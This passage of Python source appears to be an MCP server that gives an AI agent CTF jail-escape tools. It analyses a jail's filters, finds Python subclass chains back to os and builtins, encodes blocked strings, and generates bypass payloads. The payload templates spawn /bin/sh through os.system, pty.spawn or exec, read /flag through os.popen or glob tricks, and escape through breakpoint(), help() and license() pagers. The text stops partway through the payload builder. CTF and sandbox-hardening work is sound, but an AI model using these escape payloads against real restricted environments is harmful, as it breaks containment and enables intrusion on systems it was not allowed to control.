#!/usr/bin/env python3
"""CTF Jail Escape MCP Server — pyjail and bash jail analysis, bypass payload generation."""

import ast
import json
import os
import re
import sys
import unicodedata

sys.path.insert(0, os.path.dirname(__file__))
from fastmcp import FastMCP

mcp = FastMCP(
    "ctf-jail",
    instructions=(
        "Jail escape tools for CTF pyjail and bash jail challenges. "
        "Use jail_analyze_source to parse jail source code and identify restrictions, "
        "jail_find_subclass_chain to find MRO paths to useful modules, "
        "jail_construct_string to build blocked strings from allowed chars, "
        "jail_build_payload to generate complete bypass payloads."
    ),
)

# ---------------------------------------------------------------------------
# Common constants
# ---------------------------------------------------------------------------

PYTHON_DANGEROUS_BUILTINS = [
    "eval",
    "exec",
    "compile",
    "__import__",
    "open",
    "input",
    "getattr",
    "setattr",
    "delattr",
    "globals",
    "locals",
    "vars",
    "dir",
    "type",
    "breakpoint",
    "exit",
    "quit",
]

PYTHON_COMMON_BLOCKS = [
    "import",
    "os",
    "system",
    "subprocess",
    "popen",
    "eval",
    "exec",
    "compile",
    "open",
    "read",
    "flag",
    "builtins",
    "__",
    "getattr",
    "setattr",
    "breakpoint",
    "exit",
    "quit",
]

BASH_BUILTINS = [
    "echo",
    "printf",
    "read",
    "eval",
    "source",
    ".",
    "exec",
    "set",
    "unset",
    "export",
    "declare",
    "typeset",
    "local",
    "cd",
    "pwd",
    "pushd",
    "popd",
    "dirs",
    "test",
    "[",
    "[[",
    "true",
    "false",
    "break",
    "continue",
    "return",
    "exit",
    "shift",
    "getopts",
    "hash",
    "type",
    "command",
    "builtin",
    "enable",
    "help",
    "let",
    "mapfile",
    "readarray",
    "trap",
    "umask",
    "wait",
    "jobs",
    "fg",
    "bg",
    "compgen",
    "complete",
    "compopt",
]

# Unicode fullwidth mappings for NFKC normalization bypass
_FULLWIDTH_MAP = {}
for _cp in range(0xFF01, 0xFF5F):
    _norm = unicodedata.normalize("NFKC", chr(_cp))
    if len(_norm) == 1 and _norm != chr(_cp):
        _FULLWIDTH_MAP[_norm] = chr(_cp)


# ---------------------------------------------------------------------------
# Tool 1: jail_analyze_source
# ---------------------------------------------------------------------------


def _detect_jail_type(source: str) -> str:
    """Heuristic detection of jail type from source code."""
    py_indicators = 0
    bash_indicators = 0

    # Python indicators
    if re.search(r"\bdef\b|\bclass\b|\bimport\b|\bfrom\b", source):
        py_indicators += 2
    if re.search(r"\bexec\s*\(|\beval\s*\(|\bcompile\s*\(", source):
        py_indicators += 2
    if re.search(r"__builtins__|ast\.parse|ast\.walk", source):
        py_indicators += 3
    if re.search(r"\binput\s*\(|\bprint\s*\(", source):
        py_indicators += 1

    # Bash indicators
    if re.search(r"#!/bin/(ba)?sh|#!/usr/bin/env\s+bash", source):
        bash_indicators += 3
    if re.search(r'\bread\s+-[rp]|\beval\s+"\$', source):
        bash_indicators += 2
    if re.search(r"\bset\s+-r\b|\brbash\b", source):
        bash_indicators += 3
    if re.search(r"\$\{?\w+\}?|\bfi\b|\bdone\b|\besac\b", source):
        bash_indicators += 1

    if py_indicators > bash_indicators:
        return "python"
    elif bash_indicators > py_indicators:
        return "bash"
    return "python"  # default


def _analyze_python_source(source: str) -> dict:
    """Analyze a Python jail's source to identify restrictions."""
    result = {
        "jail_type": "python",
        "blocked_strings": [],
        "blocked_chars": [],
        "restriction_mechanism": [],
        "input_length_limit": None,
        "builtins_wiped": False,
        "ast_filtered": False,
        "audit_hooks": False,
        "bypass_suggestions": [],
    }

    blocked_strings = set()
    blocked_chars = set()

    # Detect string blacklists: if "xxx" in inp, if "xxx" not in inp
    for m in re.finditer(r"""["\'](\w{2,})["\'][\s]*(?:not\s+)?in\s+\w+""", source):
        blocked_strings.add(m.group(1))

    # Detect blacklist arrays/sets/tuples with string literals
    for m in re.finditer(
        r"(?:blacklist|blocked|banned|forbidden|bad|deny|filter)\w*\s*=\s*[\[\({]([^}\])]+)[\]}\)]",
        source,
        re.IGNORECASE,
    ):
        for s in re.findall(r"""["\']([^"\']+)["\']""", m.group(1)):
            if len(s) <= 30:
                blocked_strings.add(s)

    # Detect re.search/match/findall patterns
    for m in re.finditer(
        r're\.(?:search|match|findall|fullmatch)\s*\(\s*[rf]?["\']([^"\']+)["\']',
        source,
    ):
        pattern = m.group(1)
        # Extract literal strings from simple regex patterns
        literals = re.findall(r"[a-zA-Z_]{2,}", pattern)
        for lit in literals:
            blocked_strings.add(lit)

    # Detect character-level checks: for c in inp: if c in "._[]"
    # Look for short strings in `if X in "..."` or `if X not in "..."` that contain non-alnum chars
    for m in re.finditer(
        r"""if\s+\w+\s+(?:not\s+)?in\s+["\']([^"\']{1,20})["\']""", source
    ):
        candidate = m.group(1)
        # Treat as blocked char set if it contains non-alnum characters
        if any(not c.isalnum() for c in candidate):
            for c in candidate:
                blocked_chars.add(c)

    # Detect individual character checks: if "_" in inp, if "." in inp, "." not in
    for m in re.finditer(
        r"""["\']([^a-zA-Z0-9\s])["\'][\s]*(?:not\s+)?in\s+\w+""", source
    ):
        blocked_chars.add(m.group(1))

    # Detect compiled regex character classes: re.compile(r"[_.]")
    for m in re.finditer(r"""re\.compile\s*\(\s*r?["\'].*?\[([^\]]+)\]""", source):
        char_class = m.group(1)
        for c in char_class:
            if c != "\\" and not c.isalnum():
                blocked_chars.add(c)
            elif c == "_":
                blocked_chars.add(c)

    # Detect ord()-based range checks: block chars outside printable range or specific values
    for m in re.finditer(r"ord\s*\(\s*\w+\s*\)\s*([<>=!]+)\s*(\d+)", source):
        op, val = m.group(1), int(m.group(2))
        # If checking ord(c) < 32 or > 126, it's filtering non-printable
        # If checking specific values like ord(c) == 95, that blocks underscore
        if op in ("==", "!=") and 0 < val < 128:
            blocked_chars.add(chr(val))

    # Detect set/frozenset of blocked characters
    for m in re.finditer(r"""(?:set|frozenset)\s*\(\s*["\']([^"\']+)["\']""", source):
        candidate = m.group(1)
        if any(not c.isalnum() for c in candidate):
            for c in candidate:
                blocked_chars.add(c)

    # Detect whitelist patterns (allowed chars — everything else is blocked)
    for m in re.finditer(
        r"""(?:allowed|whitelist|safe)\w*\s*=\s*["\']([^"\']+)["\']""",
        source,
        re.IGNORECASE,
    ):
        result["restriction_mechanism"].append("whitelist")
        result["_whitelist_chars"] = m.group(1)

    # Detect builtins wiped
    if re.search(r"""__builtins__["\']?\s*:\s*\{\s*\}""", source):
        result["builtins_wiped"] = True
        result["restriction_mechanism"].append("builtins_wiped")
    if re.search(r"""__builtins__["\']?\s*:\s*None""", source):
        result["builtins_wiped"] = True
        result["restriction_mechanism"].append("builtins_wiped")

    # Detect AST filtering
    if re.search(r"ast\.parse|ast\.walk|ast\.NodeVisitor|ast\.dump", source):
        result["ast_filtered"] = True
        result["restriction_mechanism"].append("ast_filtering")
        # Try to find which AST nodes are blocked
        for m in re.finditer(r"ast\.(\w+)", source):
            node_name = m.group(1)
            if node_name not in (
                "parse",
                "walk",
                "dump",
                "literal_eval",
                "NodeVisitor",
                "NodeTransformer",
                "fix_missing_locations",
            ):
                blocked_strings.add(f"ast.{node_name}")

    # Detect audit hooks
    if re.search(r"sys\.addaudithook|addaudithook", source):
        result["audit_hooks"] = True
        result["restriction_mechanism"].append("audit_hooks")

    # Detect length limits
    for m in re.finditer(r"len\s*\(\s*\w+\s*\)\s*[><=]+\s*(\d+)", source):
        limit = int(m.group(1))
        if result["input_length_limit"] is None or limit < result["input_length_limit"]:
            result["input_length_limit"] = limit

    # Detect blacklist-based filtering
    if blocked_strings or blocked_chars:
        result["restriction_mechanism"].append("blacklist_check")

    # Detect exec/eval usage (how input is executed)
    if re.search(r"\bexec\s*\(", source):
        result["restriction_mechanism"].append("exec")
    if re.search(r"\beval\s*\(", source):
        result["restriction_mechanism"].append("eval")

    result["blocked_strings"] = sorted(blocked_strings)
    result["blocked_chars"] = sorted(blocked_chars)
    if not result["restriction_mechanism"]:
        result["restriction_mechanism"] = ["unknown"]

    # Generate bypass suggestions
    suggestions = []
    if result["builtins_wiped"]:
        suggestions.append(
            "Builtins wiped: recover via ().__class__.__base__.__subclasses__() "
            "to find classes with useful __init__.__globals__"
        )
    if "_" in blocked_chars:
        suggestions.append(
            "Underscores blocked: use chr(95), Unicode fullwidth \uff3f (NFKC normalizes to _), "
            "or \\x5f hex escapes"
        )
    if "." in blocked_chars:
        suggestions.append("Dots blocked: use getattr(obj, 'attr') instead of obj.attr")
    if any(q in blocked_chars for q in ("'", '"')):
        suggestions.append(
            "Quotes blocked: use chr() for string construction, "
            "or bytes([...]).decode() to build strings"
        )
    if "import" in blocked_strings:
        suggestions.append(
            "Import blocked: use __import__ (if underscores allowed), "
            "or recover via subclass __init__.__globals__"
        )
    if result["ast_filtered"]:
        suggestions.append(
            "AST filtering: check which node types are blocked. "
            "Try lambda, list comprehensions, or walrus operator if not filtered"
        )
    if result["audit_hooks"]:
        suggestions.append(
            "Audit hooks: try ctypes to remove hooks, or use operations "
            "that don't trigger audited events"
        )
    if "(" in blocked_chars and ")" in blocked_chars:
        suggestions.append(
            "Parentheses blocked: use decorator syntax @func\\nclass X:pass, "
            "or generator expressions in contexts that don't need parens"
        )
    if "[" in blocked_chars and "]" in blocked_chars:
        suggestions.append(
            "Brackets blocked: use __getitem__ via getattr, "
            "or dict.get() / tuple unpacking"
        )
    if "whitelist" in result.get("restriction_mechanism", []):
        wl = result.get("_whitelist_chars", "")
        suggestions.append(
            f"Whitelist detected (allowed: '{wl}'). Only use these characters. "
            "Try arithmetic expressions, variable names, or builtins composed from allowed chars."
        )
    if (
        "exec" in result.get("restriction_mechanism", [])
        and not result["builtins_wiped"]
    ):
        suggestions.append(
            "exec() available with builtins: try breakpoint() for interactive shell, "
            "or help() shell escape, or license() for file read"
        )
    result.pop("_whitelist_chars", None)  # internal field, don't expose
    result["bypass_suggestions"] = suggestions

    return result


def _analyze_bash_source(source: str) -> dict:
    """Analyze a bash jail's source to identify restrictions."""
    result = {
        "jail_type": "bash",
        "blocked_strings": [],
        "blocked_chars": [],
        "restriction_mechanism": [],
        "input_length_limit": None,
        "restricted_shell": False,
        "path_cleared": False,
        "available_builtins": [],
        "bypass_suggestions": [],
    }

    blocked_strings = set()
    blocked_chars = set()

    # Detect restricted shell
    if re.search(r"\bset\s+-r\b|\brbash\b|restricted", source):
        result["restricted_shell"] = True
        result["restriction_mechanism"].append("restricted_shell")

    # Detect PATH clearing
    if re.search(r'PATH\s*=\s*["\']?\s*["\']?|unset\s+PATH', source):
        result["path_cleared"] = True
        result["restriction_mechanism"].append("path_cleared")

    # Detect blocked commands
    for m in re.finditer(
        r"(?:blacklist|blocked|banned|forbidden|deny|filter)\w*\s*=\s*[\(\[]([^)\]]+)[\)\]]",
        source,
        re.IGNORECASE,
    ):
        for s in re.findall(r"""["\']([^"\']+)["\']""", m.group(1)):
            blocked_strings.add(s)

    # Detect string checks in bash: *word* or case patterns
    for m in re.finditer(r"""\*(\w+)\*""", source):
        blocked_strings.add(m.group(1))

    # Detect character checks
    for m in re.finditer(r"""["\']([^a-zA-Z0-9\s]{1,10})["\']""", source):
        candidate = m.group(1)
        if len(candidate) <= 5:
            for c in candidate:
                blocked_chars.add(c)

    # Detect length limits
    for m in re.finditer(r"\$\{#\w+\}\s*-(?:gt|ge)\s*(\d+)", source):
        limit = int(m.group(1))
        if result["input_length_limit"] is None or limit < result["input_length_limit"]:
            result["input_length_limit"] = limit

    if blocked_strings or blocked_chars:
        result["restriction_mechanism"].append("blacklist_check")

    result["blocked_strings"] = sorted(blocked_strings)
    result["blocked_chars"] = sorted(blocked_chars)
    if not result["restriction_mechanism"]:
        result["restriction_mechanism"] = ["unknown"]

    # Identify available builtins (those not in blocked list)
    available = [b for b in BASH_BUILTINS if b not in blocked_strings]
    result["available_builtins"] = available

    # Bypass suggestions
    suggestions = []
    if result["path_cleared"]:
        suggestions.append(
            "PATH cleared: use full paths (/bin/cat), builtins (echo $(<file)), "
            "or reconstruct PATH via ${HOME:0:0}/bin"
        )
    if result["restricted_shell"]:
        suggestions.append(
            "Restricted shell: try vi/less/man shell escapes, "
            "BASH_ENV, LD_PRELOAD, or command -p"
        )
    if "/" in blocked_chars:
        suggestions.append(
            "Slash blocked: use ${PATH:0:1} or ${HOME:0:1} to get /, "
            "or ${PATH%%:*} for first PATH component"
        )
    if any(c in blocked_chars for c in (";", "&", "|")):
        suggestions.append(
            "Command separators blocked: try newlines, $() subshells, "
            "or eval with constructed strings"
        )
    result["bypass_suggestions"] = suggestions

    return result


@mcp.tool()
def jail_analyze_source(source: str, jail_type: str = "auto") -> str:
    """Analyze jail source code to identify restrictions, blocked items, and suggest bypasses.

    Parses the jail script (Python or bash) to find blacklisted strings/chars,
    restriction mechanisms (blacklist, AST filtering, audit hooks, builtins wiped),
    input length limits, and generates bypass suggestions.

    Args:
        source: The jail's source code (the script that wraps/filters user input)
        jail_type: "python", "bash", or "auto" (auto-detects from source)
    """
    if not source.strip():
        return json.dumps({"error": "Empty source code"})

    if jail_type == "auto":
        jail_type = _detect_jail_type(source)

    if jail_type == "python":
        result = _analyze_python_source(source)
    elif jail_type == "bash":
        result = _analyze_bash_source(source)
    else:
        return json.dumps(
            {
                "error": f"Unknown jail_type: {jail_type}. Use 'python', 'bash', or 'auto'."
            }
        )

    return json.dumps(result, indent=2)


# ---------------------------------------------------------------------------
# Tool 2: jail_find_subclass_chain
# ---------------------------------------------------------------------------


def _find_chains(target: str, blocked_strings: list, blocked_chars: list) -> dict:
    """Walk Python MRO to find subclass chains reaching the target module."""
    result = {
        "target": target,
        "python_version": f"{sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}",
        "chains": [],
        "all_useful_subclasses": [],
    }

    subclasses = ().__class__.__base__.__subclasses__()
    blocked_s = set(blocked_strings)
    blocked_c = set(blocked_chars)

    def _is_blocked(text: str) -> bool:
        for bs in blocked_s:
            if bs in text:
                return True
        for bc in blocked_c:
            if bc in text:
                return True
        return False

    for i, cls in enumerate(subclasses):
        try:
            init = cls.__init__
            if not hasattr(init, "__globals__"):
                continue
            globs = init.__globals__
        except (TypeError, AttributeError):
            continue

        # Collect useful globals (modules and builtins)
        useful_globals = []
        for name, val in globs.items():
            if name.startswith("_") and name != "__builtins__":
                continue
            if hasattr(val, "__module__") or name == "__builtins__":
                useful_globals.append(name)

        if not useful_globals:
            continue

        cls_name = (
            f"{cls.__module__}.{cls.__qualname__}"
            if hasattr(cls, "__module__")
            else str(cls)
        )
        sub_info = {
            "index": i,
            "name": cls_name,
            "globals": sorted(useful_globals),
        }
        result["all_useful_subclasses"].append(sub_info)

        # Check if target is directly available
        if target in globs:
            path = f"().__class__.__base__.__subclasses__()[{i}].__init__.__globals__['{target}']"
            if not _is_blocked(path):
                result["chains"].append(
                    {
                        "index": i,
                        "class_name": cls_name,
                        "path": path,
                        "available_globals": sorted(useful_globals),
                    }
                )

        # Check if target is accessible via __builtins__
        if "__builtins__" in globs:
            bi = globs["__builtins__"]
            bi_dict = bi if isinstance(bi, dict) else getattr(bi, "__dict__", {})
            if target in bi_dict:
                path = f"().__class__.__base__.__subclasses__()[{i}].__init__.__globals__['__builtins__']['{target}']"
                if not _is_blocked(path):
                    result["chains"].append(
                        {
                            "index": i,
                            "class_name": cls_name,
                            "path": path,
                            "available_globals": sorted(useful_globals),
                        }
                    )

    result["chains_found"] = len(result["chains"])
    # Limit output size
    result["all_useful_subclasses"] = result["all_useful_subclasses"][:50]
    result["chains"] = result["chains"][:20]
    result["warning"] = (
        "Subclass indices are specific to Python "
        f"{sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}. "
        "If the target jail runs a different Python version, indices WILL differ. "
        "Use the class name search pattern instead: "
        "[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='ClassName']"
    )

    return result


@mcp.tool()
def jail_find_subclass_chain(
    target: str = "os",
    blocked_strings: str = "",
    blocked_chars: str = "",
) -> str:
    """Walk Python MRO/subclass tree to find chains reaching a target module or builtin.

    Enumerates ().__class__.__base__.__subclasses__() and inspects each class's
    __init__.__globals__ for the target. Returns working Python expressions that
    recover the target without using import.

    Args:
        target: Module or builtin to find (e.g. "os", "subprocess", "__import__", "open")
        blocked_strings: Comma-separated strings to avoid in generated paths
        blocked_chars: Characters to avoid in generated paths
    """
    bl_strings = (
        [s.strip() for s in blocked_strings.split(",") if s.strip()]
        if blocked_strings
        else []
    )
    bl_chars = list(blocked_chars) if blocked_chars else []

    result = _find_chains(target, bl_strings, bl_chars)
    return json.dumps(result, indent=2)


# ---------------------------------------------------------------------------
# Tool 3: jail_construct_string
# ---------------------------------------------------------------------------


def _construct_python_string(
    target: str, blocked_chars: set, blocked_strings: set
) -> list:
    """Generate Python expressions that construct the target string."""
    constructions = []

    def _has_blocked(expr: str) -> bool:
        for bs in blocked_strings:
            if bs in expr:
                return True
        for bc in blocked_chars:
            if bc in expr:
                return True
        return False

    # Method 1: chr() concatenation
    chr_available = (
        "c" not in blocked_chars
        and "h" not in blocked_chars
        and "r" not in blocked_chars
    )
    parens_available = "(" not in blocked_chars and ")" not in blocked_chars
    plus_available = "+" not in blocked_chars

    if chr_available and parens_available and plus_available:
        parts = [f"chr({ord(c)})" for c in target]
        expr = "+".join(parts)
        if not _has_blocked(expr):
            constructions.append(
                {
                    "expression": expr,
                    "technique": "chr_concatenation",
                    "length": len(expr),
                    "uses_blocked": False,
                }
            )

    # Method 2: bytes([...]).decode()
    if parens_available and "[" not in blocked_chars and "]" not in blocked_chars:
        ords = ",".join(str(ord(c)) for c in target)
        expr = f"bytes([{ords}]).decode()"
        if not _has_blocked(expr):
            constructions.append(
                {
                    "expression": expr,
                    "technique": "bytes_decode",
                    "length": len(expr),
                    "uses_blocked": False,
                }
            )

    # Method 3: hex escape in string literal
    for quote in ('"', "'"):
        if quote not in blocked_chars and "\\" not in blocked_chars:
            hex_chars = "".join(f"\\x{ord(c):02x}" for c in target)
            expr = f"{quote}{hex_chars}{quote}"
            if not _has_blocked(expr):
                constructions.append(
                    {
                        "expression": expr,
                        "technique": "hex_escape",
                        "length": len(expr),
                        "uses_blocked": False,
                    }
                )
            break

    # Method 4: f-string with :c format
    if (
        "{" not in blocked_chars
        and "}" not in blocked_chars
        and "f" not in blocked_chars
    ):
        for quote in ('"', "'"):
            if quote not in blocked_chars:
                parts = [f"f{quote}{{{ord(c)}:c}}{quote}" for c in target]
                if plus_available:
                    expr = "+".join(parts)
                    if not _has_blocked(expr):
                        constructions.append(
                            {
                                "expression": expr,
                                "technique": "fstring_format",
                                "length": len(expr),
                                "uses_blocked": False,
                            }
                        )
                break

    # Method 5: octal escape in string literal
    for quote in ('"', "'"):
        if quote not in blocked_chars and "\\" not in blocked_chars:
            oct_chars = "".join(f"\\{ord(c):03o}" for c in target)
            expr = f"{quote}{oct_chars}{quote}"
            if not _has_blocked(expr):
                constructions.append(
                    {
                        "expression": expr,
                        "technique": "octal_escape",
                        "length": len(expr),
                        "uses_blocked": False,
                    }
                )
            break

    # Method 6: format() builtin
    if parens_available and "f" not in blocked_chars:
        for quote in ('"', "'"):
            if quote not in blocked_chars:
                parts = [f"format({ord(c)},{quote}c{quote})" for c in target]
                if plus_available:
                    expr = "+".join(parts)
                    if not _has_blocked(expr):
                        constructions.append(
                            {
                                "expression": expr,
                                "technique": "format_builtin",
                                "length": len(expr),
                                "uses_blocked": False,
                            }
                        )
                break

    # Method 7: Unicode NFKC normalization
    nfkc_parts = []
    all_nfkc = True
    for c in target:
        if c in _FULLWIDTH_MAP:
            nfkc_parts.append(_FULLWIDTH_MAP[c])
        else:
            all_nfkc = False
            break
    if all_nfkc and nfkc_parts:
        nfkc_str = "".join(nfkc_parts)
        # The fullwidth chars normalize to ASCII via NFKC
        constructions.append(
            {
                "expression": nfkc_str,
                "technique": "unicode_nfkc",
                "length": len(nfkc_str),
                "uses_blocked": False,
                "note": "Fullwidth Unicode chars that normalize to ASCII via NFKC. "
                "ONLY works if: (1) jail explicitly calls unicodedata.normalize('NFKC', input), "
                "(2) used as Python identifiers (auto-normalized), or "
                "(3) jail uses str.isidentifier() checks. Does NOT work in most string comparisons.",
            }
        )

    # Sort by length
    constructions.sort(key=lambda x: x["length"])
    return constructions


def _construct_bash_string(
    target: str, blocked_chars: set, blocked_strings: set
) -> list:
    """Generate bash expressions that construct the target string."""
    constructions = []

    def _has_blocked(expr: str) -> bool:
        for bs in blocked_strings:
            if bs in expr:
                return True
        for bc in blocked_chars:
            if bc in expr:
                return True
        return False

    # Method 1: $'\xNN' hex escapes
    if (
        "$" not in blocked_chars
        and "\\" not in blocked_chars
        and "'" not in blocked_chars
    ):
        hex_chars = "".join(f"\\x{ord(c):02x}" for c in target)
        expr = f"$'{hex_chars}'"
        if not _has_blocked(expr):
            constructions.append(
                {
                    "expression": expr,
                    "technique": "dollar_hex_escape",
                    "length": len(expr),
                    "uses_blocked": False,
                }
            )

    # Method 2: $(printf ...) subshell
    if (
        "$" not in blocked_chars
        and "(" not in blocked_chars
        and ")" not in blocked_chars
    ):
        hex_chars = "".join(f"\\\\x{ord(c):02x}" for c in target)
        expr = f'$(printf "{hex_chars}")'
        if not _has_blocked(expr):
            constructions.append(
                {
                    "expression": expr,
                    "technique": "printf_subshell",
                    "length": len(expr),
                    "uses_blocked": False,
                }
            )

    # Method 3: For "/" specifically, use variable slicing
    if target == "/":
        for var in ("PATH", "HOME", "PWD"):
            expr = f"${{{var}:0:1}}"
            if not _has_blocked(expr):
                constructions.append(
                    {
                        "expression": expr,
                        "technique": f"variable_slice_{var}",
                        "length": len(expr),
                        "uses_blocked": False,
                    }
                )

    constructions.sort(key=lambda x: x["length"])
    return constructions


@mcp.tool()
def jail_construct_string(
    target: str,
    blocked_chars: str = "",
    blocked_strings: str = "",
    jail_type: str = "python",
) -> str:
    """Construct a target string using only allowed characters/functions.

    Generates multiple representations of the target string that avoid
    blocked characters and substrings. Useful for building strings like
    "__import__", "os", "/flag" when those chars are filtered.

    Args:
        target: The string to construct (e.g. "__import__", "os", "/flag")
        blocked_chars: Characters that cannot appear in the expression
        blocked_strings: Comma-separated strings that cannot appear
        jail_type: "python" or "bash"
    """
    if not target:
        return json.dumps({"error": "Empty target string"})

    bl_chars = set(blocked_chars) if blocked_chars else set()
    bl_strings = (
        set(s.strip() for s in blocked_strings.split(",") if s.strip())
        if blocked_strings
        else set()
    )

    if jail_type == "python":
        constructions = _construct_python_string(target, bl_chars, bl_strings)
    elif jail_type == "bash":
        constructions = _construct_bash_string(target, bl_chars, bl_strings)
    else:
        return json.dumps({"error": f"Unknown jail_type: {jail_type}"})

    return json.dumps(
        {
            "target": target,
            "jail_type": jail_type,
            "construction_count": len(constructions),
            "constructions": constructions,
        },
        indent=2,
    )


# ---------------------------------------------------------------------------
# Tool 4: jail_build_payload
# ---------------------------------------------------------------------------

# Template payloads for Python jails
_PY_PAYLOAD_TEMPLATES = {
    "read_flag": [
        # Direct open
        {
            "template": "open('{path}').read()",
            "technique": "direct_open",
            "note": "Simplest: direct open() call",
        },
        # Subclass chain to os._wrap_close -> os.popen
        {
            "template": (
                "[c for c in ().__class__.__base__.__subclasses__() "
                "if c.__name__=='_wrap_close'][0].__init__.__globals__"
                "['popen']('cat {path}').read()"
            ),
            "technique": "subclass_os_popen",
            "note": "Finds os._wrap_close via subclass search, uses popen to cat flag",
        },
        # Subclass chain via __builtins__.__import__
        {
            "template": (
                "[c for c in ().__class__.__base__.__subclasses__() "
                "if '__builtins__' in dir(c.__init__)][0].__init__.__globals__"
                "['__builtins__']['__import__']('os').popen('cat {path}').read()"
            ),
            "technique": "subclass_builtins_import",
            "note": "Recovers __import__ from subclass __builtins__, imports os",
        },
        # Using getattr to avoid dots
        {
            "template": (
                "getattr(getattr(getattr(getattr((),"
                "'{us}{us}class{us}{us}'),'{us}{us}base{us}{us}'),"
                "'{us}{us}subclasses{us}{us}')(),"
                "'{us}{us}getitem{us}{us}')(0)"
            ),
            "technique": "getattr_chain",
            "note": "Uses getattr() to avoid dot notation entirely",
        },
    ],
    "exec_command": [
        {
            "template": "__import__('os').system('{cmd}')",
            "technique": "direct_import_system",
            "note": "Direct __import__ + os.system",
        },
        {
            "template": "__import__('os').popen('{cmd}').read()",
            "technique": "direct_import_popen",
            "note": "Direct __import__ + os.popen (captures output)",
        },
        {
            "template": (
                "[c for c in ().__class__.__base__.__subclasses__() "
                "if c.__name__=='_wrap_close'][0].__init__.__globals__"
                "['popen']('{cmd}').read()"
            ),
            "technique": "subclass_popen",
            "note": "Subclass chain to os.popen",
        },
        {
            "template": "eval(compile('__import__(\"os\").system(\"{cmd}\")','','exec'))",
            "technique": "eval_compile",
            "note": "eval() + compile() when exec is blocked but eval isn't",
        },
    ],
    "recover_builtins": [
        {
            "template": (
                "().__class__.__base__.__subclasses__()[{idx}]"
                ".__init__.__globals__['__builtins__']"
            ),
            "technique": "subclass_builtins_recovery",
            "note": "Recovers __builtins__ dict from a subclass's globals. "
            "Index varies by Python version — use jail_find_subclass_chain to find it.",
        },
        {
            "template": "breakpoint()",
            "technique": "breakpoint_shell",
            "note": "Drops into pdb interactive shell if breakpoint() is not blocked. "
            "From pdb: import os; os.system('cat /flag')",
        },
        {
            "template": "help()",
            "technique": "help_shell",
            "note": "Opens interactive help. Type '!import os; os.system(\"cat /flag\")' "
            "to escape into a shell command",
        },
        {
            "template": "license()",
            "technique": "license_pager",
            "note": "Opens license text in pager (less/more). "
            "Use '!cat /flag' to escape pager into shell",
        },
    ],
    "get_shell": [
        {
            "template": "__import__('os').system('/bin/sh')",
            "technique": "direct_shell",
            "note": "Direct os.system shell",
        },
        {
            "template": "__import__('pty').spawn('/bin/sh')",
            "technique": "pty_spawn",
            "note": "Interactive shell via pty.spawn",
        },
        {
            "template": "breakpoint()",
            "technique": "breakpoint_pdb",
            "note": "Drops into pdb. Use !import os; os.system('/bin/sh') for shell",
        },
        {
            "template": (
                "[c for c in ().__class__.__base__.__subclasses__() "
                "if c.__name__=='_wrap_close'][0].__init__.__globals__"
                "['system']('/bin/sh')"
            ),
            "technique": "subclass_system",
            "note": "Subclass chain to os.system for shell",
        },
    ],
}

# Template payloads for bash jails
_BASH_PAYLOAD_TEMPLATES = {
    "read_flag": [
        {
            "template": "cat {path}",
            "technique": "direct_cat",
            "note": "Direct cat command",
        },
        {
            "template": "echo $(<{path})",
            "technique": "bash_redirect_read",
            "note": "Bash built-in file read via $(<file)",
        },
        {
            "template": "read -r line < {path} && echo $line",
            "technique": "read_builtin",
            "note": "Read first line via read builtin",
        },
        {
            "template": "while read -r line; do echo $line; done < {path}",
            "technique": "while_read_loop",
            "note": "Read all lines via while loop",
        },
        {
            "template": "/???/??t {path}",
            "technique": "glob_cat",
            "note": "Glob pattern matching /bin/cat",
        },
        {
            "template": "${PATH:0:1}???${PATH:0:1}??t {path}",
            "technique": "glob_variable_cat",
            "note": "Glob + variable slicing for /bin/cat",
        },
    ],
    "exec_command": [
        {
            "template": "{cmd}",
            "technique": "direct",
            "note": "Direct command execution",
        },
        {
            "template": "eval {cmd}",
            "technique": "eval_builtin",
            "note": "Via eval builtin",
        },
        {
            "template": "bash -c '{cmd}'",
            "technique": "bash_c",
            "note": "New bash subshell",
        },
        {
            "template": "$({cmd})",
            "technique": "command_substitution",
            "note": "Execute via $() command substitution",
        },
        {
            "template": "exec 3>&1; {cmd} >&3",
            "technique": "fd_redirect",
            "note": "Execute via file descriptor redirection",
        },
    ],
    "get_shell": [
        {
            "template": "/bin/sh",
            "technique": "direct_sh",
            "note": "Direct shell invocation",
        },
        {
            "template": "$0",
            "technique": "dollar_zero",
            "note": "$0 is the current shell — spawns new instance",
        },
        {
            "template": "/???/??",
            "technique": "glob_sh",
            "note": "Glob pattern matching /bin/sh",
        },
        {
            "template": "exec /bin/sh",
            "technique": "exec_builtin",
            "note": "Replace current process with shell via exec builtin",
        },
        {
            "template": "command -p sh",
            "technique": "command_default_path",
            "note": "Use command -p to search default PATH even if PATH is cleared",
        },
    ],
}


def _apply_char_bypass(payload: str, blocked_chars: set, blocked_strings: set) -> list:
    """Generate variants of a payload with blocked chars/strings replaced."""
    variants = []

    # Check if payload is already clean
    has_blocked = False
    for bc in blocked_chars:
        if bc in payload:
            has_blocked = True
            break
    if not has_blocked:
        for bs in blocked_strings:
            if bs in payload:
                has_blocked = True
                break

    if not has_blocked:
        return [payload]

    # Try chr() replacement for blocked chars (Python)
    result = payload
    for bc in blocked_chars:
        if bc in result:
            result = result.replace(bc, f"'+chr({ord(bc)})+'")
    # Clean up empty string concatenations
    result = result.replace("'+'", "").replace("'+''+'", "")
    variants.append(result)

    # Try hex escape replacement
    result2 = payload
    for bc in blocked_chars:
        if bc in result2:
            result2 = result2.replace(bc, f"\\x{ord(bc):02x}")
    variants.append(result2)

    return variants


@mcp.tool()
def jail_build_payload(
    jail_type: str = "python",
    blocked_strings: str = "",
    blocked_chars: str = "",
    builtins_wiped: bool = False,
    goal: str = "read_flag",
    flag_path: str = "/flag",
    max_length: int = 0,
) -> str:
    """Generate jail bypass payloads that avoid blocked strings and characters.

    Produces multiple payload variants for Python or bash jails, filtered to
    exclude any blocked items. Payloads are ranked by length.

    Args:
        jail_type: "python" or "bash"
        blocked_strings: Comma-separated blocked strings (e.g. "import,os,system")
        blocked_chars: Blocked characters as a string (e.g. "_.[]")
        builtins_wiped: Whether Python __builtins__ is {} (triggers subclass chain payloads)
        goal: "read_flag", "exec_command", "get_shell", "recover_builtins"
        flag_path: Path to flag file (for read_flag goal)
        max_length: Maximum payload length (0 = unlimited)
    """
    bl_strings = (
        set(s.strip() for s in blocked_strings.split(",") if s.strip())
        if blocked_strings
        else set()
    )
    bl_chars = set(blocked_chars) if blocked_chars else set()

    us = chr(95)  # underscore, used in template formatting

    if jail_type == "python":
        templates = _PY_PAYLOAD_TEMPLATES.get(goal, [])
